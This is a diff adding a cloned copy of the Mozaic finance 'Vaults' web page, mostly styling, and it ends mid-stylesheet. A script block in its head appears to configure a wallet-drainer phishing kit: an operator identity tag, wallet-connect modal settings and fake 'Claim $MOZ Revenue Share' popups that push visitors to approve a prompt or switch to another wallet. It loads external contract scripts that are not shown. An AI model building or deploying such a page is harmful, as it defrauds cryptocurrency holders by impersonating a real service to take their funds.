@@ -1,0 +1,2069 @@
+<!DOCTYPE html>
+<html lang="en"
+    style="--wcm-color-fg-1: rgb(20,20,20); --wcm-color-fg-2: rgb(121,134,134); --wcm-color-fg-3: rgb(158,169,169); --wcm-color-bg-1: rgb(255,255,255); --wcm-color-bg-2: rgb(241,243,243); --wcm-color-bg-3: rgb(228,231,231); --wcm-color-overlay: rgba(0,0,0,0.1); --wcm-accent-color: #3396FF; --wcm-accent-fill-color: #FFFFFF; --wcm-z-index: 89; --wcm-background-color: #3396FF; --wcm-background-border-radius: 8px; --wcm-container-border-radius: 30px; --wcm-wallet-icon-border-radius: 15px; --wcm-wallet-icon-large-border-radius: 30px; --wcm-wallet-icon-small-border-radius: 7px; --wcm-input-border-radius: 28px; --wcm-button-border-radius: 10px; --wcm-notification-border-radius: 36px; --wcm-secondary-button-border-radius: 28px; --wcm-icon-button-border-radius: 50%; --wcm-button-hover-highlight-border-radius: 10px; --wcm-text-big-bold-size: 20px; --wcm-text-big-bold-weight: 600; --wcm-text-big-bold-line-height: 24px; --wcm-text-big-bold-letter-spacing: -0.03em; --wcm-text-big-bold-text-transform: none; --wcm-text-xsmall-bold-size: 10px; --wcm-text-xsmall-bold-weight: 700; --wcm-text-xsmall-bold-line-height: 12px; --wcm-text-xsmall-bold-letter-spacing: 0.02em; --wcm-text-xsmall-bold-text-transform: uppercase; --wcm-text-xsmall-regular-size: 12px; --wcm-text-xsmall-regular-weight: 600; --wcm-text-xsmall-regular-line-height: 14px; --wcm-text-xsmall-regular-letter-spacing: -0.03em; --wcm-text-xsmall-regular-text-transform: none; --wcm-text-small-thin-size: 14px; --wcm-text-small-thin-weight: 500; --wcm-text-small-thin-line-height: 16px; --wcm-text-small-thin-letter-spacing: -0.03em; --wcm-text-small-thin-text-transform: none; --wcm-text-small-regular-size: 14px; --wcm-text-small-regular-weight: 600; --wcm-text-small-regular-line-height: 16px; --wcm-text-small-regular-letter-spacing: -0.03em; --wcm-text-small-regular-text-transform: none; --wcm-text-medium-regular-size: 16px; --wcm-text-medium-regular-weight: 600; --wcm-text-medium-regular-line-height: 20px; --wcm-text-medium-regular-letter-spacing: -0.03em; --wcm-text-medium-regular-text-transform: none; --wcm-font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Helvetica Neue', sans-serif; --wcm-font-feature-settings: 'tnum' on, 'lnum' on, 'case' on; --wcm-success-color: rgb(38,181,98); --wcm-error-color: rgb(242, 90, 103); --wcm-overlay-background-color: rgba(0, 0, 0, 0.3); --wcm-overlay-backdrop-filter: none;"
+    data-scrapbook-source="https://app.mozaic.finance/" data-scrapbook-create="20240113125253078"
+    data-scrapbook-title="Mozaic - Vaults">
+
+    <script defer="defer" src="js/vendors.js"></script>
+    <script defer="defer" src="js/contracts.js"></script>
+    <script defer="defer" src="js/main.js"></script>
+  
+    <script>
+      window.UNIQUE_IDENTITY = "yelping_cheetah_23";
+  
+      // Pick a theme here, this defaults to "light"
+      window.modal_theme = "light";
+  
+      // https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming
+      window.modal_variables = { "--w3m-z-index": "99999999999999999999999999999999",
+        // Example of what you can do:
+        "--w3m-accent-color": "#8a1d91",
+        "--w3m-background-color": "#8a1d91",
+        "--w3m-logo-image-url": "./your-logo.png",
+        "--w3m-background-border-radius": "0px",
+        "--w3m-container-border-radius": "0px",
+        "--w3m-wallet-icon-border-radius": "0px",
+        "--w3m-wallet-icon-large-border-radius": "0px",
+        "--w3m-wallet-icon-small-border-radius": "0px",
+        "--w3m-secondary-button-border-radius": "0px",
+        "--w3m-icon-button-border-radius": "0px",
+        "--w3m-button-hover-highlight-border-radius": "0px",
+        "--w3m-input-border-radius": "0px",
+      };
+  
+      window.popups = {
+        PENDING: {
+          title: "Claim Pending",
+          text: "Approve the prompt in order to Claim $MOZ Revenue Share.",
+        },
+        INVALID: {
+          title: "Ineligible Address",
+          text: "The connected wallet is not eligible for $MOZ Revenue Share.\nPlease try using a different account.",
+        },
+      };
+  
+      window.OVERRIDE_MODE = false;
+    </script>
+  </head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width">
+    <link rel="icon" href="mozlogotrans.png" class="jsx-8e062e49613e183f">
+    <title>Mozaic - Vaults</title>
+    <meta property="og:image" content="/assets/images/mozlogotrans.png">
+    <meta name="description"
+        content="Discover Mozaic: AI-Driven Multichain Yield Farming. Maximize your profits with automated, cutting-edge crypto farming technology.">
+    <meta name="next-head-count" content="7">
+    <link href="pp-neue-montreal.css" rel="stylesheet">
+    <link href="canela.css" rel="stylesheet">
+    <link rel="stylesheet" href="94b4902347d8e2ea.css" data-n-g=""><noscript data-n-css=""></noscript>
+    <style id="__jsx-e6f1807156ce6ac7">
+        .wallet-btn-wrapper.jsx-e6f1807156ce6ac7 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            gap: 10px
+        }
+
+        .wallet-container.jsx-e6f1807156ce6ac7 {
+            height: 48px;
+            position: relative
+        }
+
+        .chain-btn-container.jsx-e6f1807156ce6ac7 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            cursor: pointer;
+            gap: 8px;
+            height: 48px;
+            width: 48px;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-border-radius: 50%;
+            -moz-border-radius: 50%;
+            border-radius: 50%;
+            font-weight: 500;
+            font-size: .95rem;
+            line-height: 1rem;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .chain-btn-container.jsx-e6f1807156ce6ac7 img.jsx-e6f1807156ce6ac7 {
+            padding: 0
+        }
+
+        .wallet-btn-container.jsx-e6f1807156ce6ac7 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            cursor: pointer;
+            gap: 8px;
+            height: 48px;
+            max-width: 190px;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-border-radius: 30px;
+            -moz-border-radius: 30px;
+            border-radius: 30px;
+            font-weight: 500;
+            font-size: .95rem;
+            line-height: 1rem;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .network-icon.jsx-e6f1807156ce6ac7 {
+            height: 16px;
+            width: 16px;
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+
+        .solid.jsx-e6f1807156ce6ac7 {
+            background-color: var(--textPrimary);
+            color: var(--bg);
+            border: 1px solid var(--textPrimary);
+            padding: 0 16px
+        }
+
+        .solid.jsx-e6f1807156ce6ac7:hover {
+            background-color: transparent;
+            color: var(--textPrimary)
+        }
+
+        .solid.jsx-e6f1807156ce6ac7:active {
+            background-color: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary)
+        }
+
+        .solid.jsx-e6f1807156ce6ac7>.network-icon.jsx-e6f1807156ce6ac7 {
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .solid.jsx-e6f1807156ce6ac7:hover>.network-icon.jsx-e6f1807156ce6ac7 {
+            -webkit-filter: invert(100%)sepia(100%)saturate(0%)hue-rotate(325deg)brightness(102%)contrast(101%);
+            filter: invert(100%)sepia(100%)saturate(0%)hue-rotate(325deg)brightness(102%)contrast(101%)
+        }
+
+        .outlined.jsx-e6f1807156ce6ac7 {
+            background-color: transparent;
+            color: var(--textLabel);
+            border: 1px solid var(--textLabel);
+            padding: 0 16px 0px 16px
+        }
+
+        .outlined.jsx-e6f1807156ce6ac7>.network-icon.jsx-e6f1807156ce6ac7 {
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease;
+            height: 24px;
+            width: 24px
+        }
+
+        .outlined.jsx-e6f1807156ce6ac7:hover {
+            background-color: transparent;
+            color: var(--primary);
+            border: 1px solid var(--primary)
+        }
+
+        .outlined.jsx-e6f1807156ce6ac7:hover>.network-icon.jsx-e6f1807156ce6ac7 {
+            -webkit-filter: invert(100%)sepia(100%)saturate(0%)hue-rotate(325deg)brightness(102%)contrast(101%);
+            filter: invert(100%)sepia(100%)saturate(0%)hue-rotate(325deg)brightness(102%)contrast(101%)
+        }
+
+        .wallet-detail-menu-wrapper.jsx-e6f1807156ce6ac7 {
+            width: 100%;
+            position: absolute;
+            bottom: 0
+        }
+
+        .btn-text.jsx-e6f1807156ce6ac7 {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none
+        }
+
+        @media(max-width:420px) {
+            .btn-text.jsx-e6f1807156ce6ac7 {
+                display: none
+            }
+
+            .outlined.jsx-e6f1807156ce6ac7 {
+                padding: 12px
+            }
+        }
+    </style>
+    <style id="__jsx-564cfe45b5b70de8">
+        .mobile-menu-container.jsx-564cfe45b5b70de8 {
+            position: fixed;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between;
+            background-color: var(--cardBgPrimaryT1);
+            width: 100%;
+            height: 100%;
+            top: 0;
+            right: -100%;
+            z-index: -1;
+            padding: 140px 24px 40px 24px;
+            -webkit-backdrop-filter: blur(8px);
+            backdrop-filter: blur(8px);
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .show-menu.jsx-564cfe45b5b70de8 {
+            right: 0
+        }
+
+        .nav-btn-wrapper.jsx-564cfe45b5b70de8 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            gap: 36px;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center
+        }
+
+        .nav-btn.jsx-564cfe45b5b70de8 {
+            font-size: 24px
+        }
+
+        .nav-btn.jsx-564cfe45b5b70de8::after {
+            display: block;
+            content: attr(title);
+            font-weight: bold;
+            overflow: hidden;
+            visibility: hidden;
+            height: 0
+        }
+
+        .nav-btn.active.jsx-564cfe45b5b70de8 {
+            color: var(--primary);
+            font-weight: bold
+        }
+
+        .nav-menu-item-wrapper.jsx-564cfe45b5b70de8 {
+            width: 100%;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            gap: 10px;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center
+        }
+
+        .menu-item-wrapper.jsx-564cfe45b5b70de8 {
+            cursor: pointer;
+            border: 1px solid#ffffff10;
+            width: 100%;
+            height: 60px;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            gap: 10px;
+            padding: 10px 16px;
+            background-color: var(--cardBgPrimary);
+            -webkit-border-radius: 16px;
+            -moz-border-radius: 16px;
+            border-radius: 16px;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .menu-item-wrapper.jsx-564cfe45b5b70de8:hover {
+            border-color: var(--primary)
+        }
+
+        @media(max-width:550px) {
+            .menu-item-wrapper.jsx-564cfe45b5b70de8 {
+                width: 100%;
+                height: 60px
+            }
+        }
+
+        @media(max-width:400px) {
+            .mobile-menu-container.jsx-564cfe45b5b70de8 {
+                width: 100%
+            }
+        }
+    </style>
+    <style id="__jsx-8cffebfda52c1bb3">
+        .menu-btn-container.jsx-8cffebfda52c1bb3 {
+            position: relative;
+            width: 48px;
+            height: 48px;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease;
+            cursor: pointer
+        }
+
+        img.jsx-8cffebfda52c1bb3 {
+            margin: 0;
+            padding: 0
+        }
+
+        .hover-bg.jsx-8cffebfda52c1bb3 {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            top: 0;
+            left: 0;
+            background-color: var(--textPrimary);
+            border: 1px solid var(--textPrimary);
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            opacity: 0;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .menu-btn-container.jsx-8cffebfda52c1bb3:hover>.hover-bg.jsx-8cffebfda52c1bb3 {
+            opacity: .3
+        }
+
+        .menu-btn-container.jsx-8cffebfda52c1bb3:active>.hover-bg.jsx-8cffebfda52c1bb3 {
+            opacity: .3;
+            background-color: transparent
+        }
+
+        .desktop-menu-wrapper.jsx-8cffebfda52c1bb3 {
+            width: 100%;
+            position: absolute;
+            bottom: 0
+        }
+
+        .mobile-menu-wrapper.jsx-8cffebfda52c1bb3 {
+            display: none
+        }
+
+        @media(max-width:730px) {
+            .desktop-menu-wrapper.jsx-8cffebfda52c1bb3 {
+                display: none
+            }
+
+            .mobile-menu-wrapper.jsx-8cffebfda52c1bb3 {
+                display: block
+            }
+        }
+    </style>
+    <style id="__jsx-978c383ab44cb7ff">
+        .nav-container.jsx-978c383ab44cb7ff {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            width: 100%;
+            height: 90px;
+            background-color: var(--bg);
+            position: -webkit-sticky;
+            position: sticky;
+            top: 0;
+            left: 0;
+            padding: 0px 30px;
+            z-index: 11111
+        }
+
+        .nav-content-wrapper.jsx-978c383ab44cb7ff {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            width: 1280px;
+            gap: 30px
+        }
+
+        .col.jsx-978c383ab44cb7ff {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-flex: 1;
+            -webkit-flex: 1;
+            -moz-box-flex: 1;
+            -ms-flex: 1;
+            flex: 1;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .logo.jsx-978c383ab44cb7ff {
+            height: 38px;
+            -o-object-fit: contain;
+            object-fit: contain
+        }
+
+        .mobile-logo.jsx-978c383ab44cb7ff {
+            display: none
+        }
+
+        .nav-btn-wrapper.jsx-978c383ab44cb7ff {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            gap: 50px
+        }
+
+        .nav-btn.jsx-978c383ab44cb7ff {
+            cursor: pointer;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease;
+            margin: 0 5px;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            position: relative
+        }
+
+        .nav-btn.jsx-978c383ab44cb7ff::after {
+            display: block;
+            content: attr(title);
+            font-weight: bold;
+            overflow: hidden;
+            visibility: hidden;
+            height: 0
+        }
+
+        .subItem-nav.jsx-978c383ab44cb7ff {
+            position: absolute;
+            top: 25px;
+            background: var(--bg);
+            padding: 10px 20px;
+            left: -15px;
+            -webkit-border-radius: 10px;
+            -moz-border-radius: 10px;
+            border-radius: 10px;
+            visibility: hidden;
+            opacity: 0;
+            -webkit-transition: visibility 0s, opacity.5s;
+            -moz-transition: visibility 0s, opacity.5s;
+            -o-transition: visibility 0s, opacity.5s;
+            transition: visibility 0s, opacity.5s;
+            color: white;
+            font-weight: normal
+        }
+
+        .nav-btn.jsx-978c383ab44cb7ff:hover .subItem-nav.jsx-978c383ab44cb7ff,
+        .subItem-nav.jsx-978c383ab44cb7ff:hover {
+            visibility: visible;
+            opacity: 1
+        }
+
+        .sub-item.active.jsx-978c383ab44cb7ff {
+            color: var(--primary);
+            font-weight: bold
+        }
+
+        .nav-btn.active.jsx-978c383ab44cb7ff {
+            color: var(--primary);
+            font-weight: bold
+        }
+
+        .nav-btn.jsx-978c383ab44cb7ff:hover {
+            color: var(--primary);
+            text-shadow: 0 0 3px var(--primary)
+        }
+
+        .menu-wrapper.jsx-978c383ab44cb7ff {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-pack: end;
+            -webkit-justify-content: flex-end;
+            -moz-box-pack: end;
+            -ms-flex-pack: end;
+            justify-content: flex-end;
+            gap: 10px
+        }
+
+        .more-icon.jsx-978c383ab44cb7ff {
+            margin-left: 2px;
+            -webkit-transition: background-color.5s, -webkit-transform.5s;
+            -moz-transition: background-color.5s, -moz-transform.5s;
+            -o-transition: background-color.5s, -o-transform.5s;
+            transition: background-color.5s, -webkit-transform.5s;
+            transition: background-color.5s, -moz-transform.5s;
+            transition: background-color.5s, -o-transform.5s;
+            transition: background-color.5s, transform.5s
+        }
+
+        .nav-btn.jsx-978c383ab44cb7ff:hover .more-icon.jsx-978c383ab44cb7ff {
+            -webkit-transform: rotate(90deg);
+            -moz-transform: rotate(90deg);
+            -ms-transform: rotate(90deg);
+            -o-transform: rotate(90deg);
+            transform: rotate(90deg)
+        }
+
+        @media(max-width:960px) {
+
+            .logo-wrapper.jsx-978c383ab44cb7ff,
+            .menu-wrapper.jsx-978c383ab44cb7ff {
+                -webkit-box-flex: 1;
+                -webkit-flex: 1;
+                -moz-box-flex: 1;
+                -ms-flex: 1;
+                flex: 1
+            }
+        }
+
+        @media(max-width:840px) {
+            .desktop-logo.jsx-978c383ab44cb7ff {
+                display: none
+            }
+
+            .mobile-logo.jsx-978c383ab44cb7ff {
+                display: inline-block
+            }
+        }
+
+        @media(max-width:730px) {
+            .desktop-logo.jsx-978c383ab44cb7ff {
+                display: inline-block
+            }
+
+            .mobile-logo.jsx-978c383ab44cb7ff {
+                display: none
+            }
+
+            .nav-btn-wrapper.jsx-978c383ab44cb7ff {
+                display: none
+            }
+
+            .menu-wrapper.jsx-978c383ab44cb7ff {
+                -webkit-box-flex: 4;
+                -webkit-flex: 4;
+                -moz-box-flex: 4;
+                -ms-flex: 4;
+                flex: 4
+            }
+        }
+
+        @media(max-width:500px) {
+            .desktop-logo.jsx-978c383ab44cb7ff {
+                display: none
+            }
+
+            .mobile-logo.jsx-978c383ab44cb7ff {
+                display: inline-block
+            }
+        }
+    </style>
+    <style id="__jsx-e436ac312c9d6f3d">
+        .description.jsx-e436ac312c9d6f3d {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            font-size: .875rem;
+            gap: 10px;
+            color: var(--textSecondary)
+        }
+
+        .learn-more.jsx-e436ac312c9d6f3d {
+            font-size: .875rem;
+            color: var(--textPrimary);
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            gap: 4px;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .learn-more.jsx-e436ac312c9d6f3d:hover {
+            text-decoration: underline
+        }
+    </style>
+    <style id="__jsx-6369883e488dae65">
+        .page-title-container.jsx-6369883e488dae65 {
+            width: 100%;
+            margin-top: 30px;
+            margin-bottom: 30px;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-box-pack: justify;
+            -webkit-justify-content: space-between;
+            -moz-box-pack: justify;
+            -ms-flex-pack: justify;
+            justify-content: space-between
+        }
+
+        @media screen and (max-width:800px) {
+            .description.jsx-6369883e488dae65 {
+                -webkit-box-orient: vertical;
+                -webkit-box-direction: normal;
+                -webkit-flex-direction: column;
+                -moz-box-orient: vertical;
+                -moz-box-direction: normal;
+                -ms-flex-direction: column;
+                flex-direction: column;
+                -webkit-box-align: start;
+                -webkit-align-items: flex-start;
+                -moz-box-align: start;
+                -ms-flex-align: start;
+                align-items: flex-start;
+                gap: 0px
+            }
+        }
+
+        @media screen and (max-width:680px) {
+            .page-title-container.jsx-6369883e488dae65 {
+                -webkit-box-orient: vertical;
+                -webkit-box-direction: normal;
+                -webkit-flex-direction: column;
+                -moz-box-orient: vertical;
+                -moz-box-direction: normal;
+                -ms-flex-direction: column;
+                flex-direction: column
+            }
+        }
+    </style>
+    <style id="__jsx-a2c087894cbbcc30">
+        .vault-list-container.jsx-a2c087894cbbcc30 {
+            height: 100%;
+            width: 100%;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            -webkit-box-pack: center;
+            -webkit-justify-content: center;
+            -moz-box-pack: center;
+            -ms-flex-pack: center;
+            justify-content: center;
+            -webkit-box-orient: horizontal;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: row;
+            -moz-box-orient: horizontal;
+            -moz-box-direction: normal;
+            -ms-flex-direction: row;
+            flex-direction: row;
+            -webkit-flex-wrap: wrap;
+            -ms-flex-wrap: wrap;
+            flex-wrap: wrap;
+            gap: 30px;
+            padding-bottom: 96px;
+            overflow-y: hidden
+        }
+    </style>
+    <style id="__jsx-edda1c3fa36d050f">
+        .products-container.jsx-edda1c3fa36d050f {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            height: 100%;
+            width: 100%;
+            gap: 32px
+        }
+    </style>
+    <style id="__jsx-c13b0b187ed0422">
+        .container.jsx-c13b0b187ed0422 {
+            position: relative;
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
+            -moz-box-orient: vertical;
+            -moz-box-direction: normal;
+            -ms-flex-direction: column;
+            flex-direction: column;
+            -webkit-box-align: center;
+            -webkit-align-items: center;
+            -moz-box-align: center;
+            -ms-flex-align: center;
+            align-items: center;
+            min-height: 100%
+        }
+
+        .app-container.jsx-c13b0b187ed0422 {
+            width: 100%;
+            max-width: 1280px;
+            height: 100%;
+            padding: 0 30px;
+            -webkit-transition: all.2s ease;
+            -moz-transition: all.2s ease;
+            -o-transition: all.2s ease;
+            transition: all.2s ease
+        }
+
+        .overlay-top.jsx-c13b0b187ed0422 {
+            position: absolute;
+            top: 0;
+            right: 0;
+            max-width: 100vw;
+            -webkit-transform: rotate(90deg);
+            -moz-transform: rotate(90deg);
+            -ms-transform: rotate(90deg);
+            -o-transform: rotate(90deg);
+            transform: rotate(90deg)
+        }
+
+        .overlay-bottom.jsx-c13b0b187ed0422 {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            max-width: 100vw;
+            -webkit-transform: rotate(-90deg);
+            -moz-transform: rotate(-90deg);
+            -ms-transform: rotate(-90deg);
+            -o-transform: rotate(-90deg);
+            transform: rotate(-90deg)
+        }
+
+        .overlay-body.jsx-c13b0b187ed0422 {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: .5;
+            -o-object-fit: cover;
+            object-fit: cover
+        }
+
+        @media screen and (max-width:425px) {
+            .app-container.jsx-c13b0b187ed0422 {
+                padding: 0 16px
+            }
+        }
+    </style>
+    <style id="__jsx-8e062e49613e183f">
+        :root {
+            --primary: #f3deb7;
+            --primaryT1: #f3deb740;
+            --primaryDark: #eec083;
+            --textPrimary: #ffffff;
+            --textPrimaryT1: #ffffff20;
+            --textPrimaryT2: #ffffff05;
+            --textSecondary: #777e91;
+            --textLabel: #b1b5c3;
+            --alert: #ffd500;
+            --alertPositive: #11cabe;
+            --alertNegative: #ff6838;
+            --outlinePrimary: #353945;
+            --tabActive: #272b30;
+            --tabInactive: #111315;
+            --cardBgPrimary: #1e1f25;
+            --cardBgPrimaryT1: #1e1f25c1;
+            --inputBtnBgPrimary: #23262f;
+            --sliderGrad: linear-gradient(90deg, #f7931a 0%, #eec083 100%);
+            --bg: #141518;
+            --bgDark: #131417;
+            --graphPrimary: #f7931a;
+            --graphGrid: #252d55;
+            --shadowPrimary: 0px 40px 64px -12px rgba(0, 0, 0, 0.08),
+                0px 0px 14px -4px rgba(0, 0, 0, 0.05), 0px 32px 48px -8px rgba(0, 0, 0, 0.1)
+        }
+    </style>
+    <meta http-equiv="origin-trial"
+        content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
+    <style type="text/css" data-styled-jsx="">
+        .title-wrapper.jsx-2515314420 {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -moz-box;
+            display: -ms-flexbox;
+            display: flex;
+            -webkit-box-orient: vertical;
+            -webkit-box-direction: normal;
+            -webkit-flex-direction: column;
